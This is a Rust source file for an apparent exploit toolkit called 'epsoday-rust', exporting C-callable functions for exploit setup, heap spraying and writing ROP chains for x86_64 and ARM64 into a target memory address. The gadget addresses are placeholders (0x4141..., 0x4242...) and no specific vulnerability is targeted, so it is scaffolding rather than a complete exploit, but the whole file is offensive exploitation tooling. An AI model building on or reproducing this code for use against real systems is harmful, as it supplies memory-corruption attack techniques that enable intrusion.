use std::ffi::{c_void, CStr, CString};
use std::ptr;
use libc::{self, size_t};

pub mod heap;
pub mod memory;
pub mod payload;
pub mod exploit;

#[repr(C)]
pub struct ExploitContext {
    pub target_addr: *mut c_void,
    pub payload: *const u8,
    pub payload_len: size_t,
}

#[no_mangle]
pub extern "C" fn rust_exploit_init(ctx: *mut ExploitContext) -> i32 {
    if ctx.is_null() {
        return -1;
    }
    
    unsafe {
        let context = &mut *ctx;
        if context.payload.is_null() || context.payload_len == 0 {
            return -2;
        }
    }
    
    0
}

#[no_mangle]
pub extern "C" fn rust_heap_spray(ctx: *mut ExploitContext) -> i32 {
    unsafe {
        let context = &mut *ctx;
        let payload = std::slice::from_raw_parts(context.payload, context.payload_len);
        
        let spray_size = 0x100000;
        let mut spray = vec![0x41u8; spray_size];
        
        for offset in (0x1000..spray_size).step_by(0x2000) {
            if offset + payload.len() <= spray_size {
                spray[offset..offset + payload.len()].copy_from_slice(payload);
            }
        }
        
        0
    }
}

#[cfg(target_arch = "x86_64")]
#[no_mangle]
pub extern "C" fn rust_rop_chain(ctx: *mut ExploitContext) -> i32 {
    unsafe {
        let context = &mut *ctx;
        let mut chain = Vec::new();

        let pop_rdi: u64 = 0x4141414141414141;
        let system: u64 = 0x4242424242424242;

        chain.extend_from_slice(&pop_rdi.to_le_bytes());
        chain.extend_from_slice(&system.to_le_bytes());

        if !context.target_addr.is_null() {
            let dest = context.target_addr as *mut u8;
            ptr::copy_nonoverlapping(chain.as_ptr(), dest, chain.len());
        }

        0
    }
}

#[cfg(target_arch = "aarch64")]
#[no_mangle]
pub extern "C" fn rust_rop_chain(ctx: *mut ExploitContext) -> i32 {
    unsafe {
        let context = &mut *ctx;
        let mut chain = Vec::new();

        // ARM64 gadgets
        let mov_x0: u64 = 0x4141414141414141;
        let blr_x1: u64 = 0x4242424242424242;

        chain.extend_from_slice(&mov_x0.to_le_bytes());
        chain.extend_from_slice(&blr_x1.to_le_bytes());

        if !context.target_addr.is_null() {
            let dest = context.target_addr as *mut u8;
            ptr::copy_nonoverlapping(chain.as_ptr(), dest, chain.len());
        }

        0
    }
}

#[no_mangle]
pub extern "C" fn rust_get_version() -> *const u8 {
    b"epsoday-rust-0.1.0\0".as_ptr()
}

#[no_mangle]
pub extern "C" fn rust_check_arch() -> i32 {
    #[cfg(target_arch = "x86_64")]
    return 64;
    #[cfg(target_arch = "aarch64")]
    return 64;
    #[cfg(target_arch = "x86")]
    return 32;
    0
}
